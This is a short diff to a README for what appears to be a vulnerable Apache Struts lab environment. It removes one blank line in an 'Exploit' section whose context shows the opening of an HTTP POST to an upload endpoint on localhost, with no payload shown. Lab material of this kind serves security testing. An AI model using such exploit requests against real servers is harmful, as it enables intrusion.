@@ -12,7 +12,6 @@ After the environment is started, visit `http://your-ip:8080/struts-1.0-SNAPSHOT
 
 ## Exploit
 
-
 ```
 POST /struts-1.0-SNAPSHOT/upload.action HTTP/1.1
 Host: 127.0.0.1
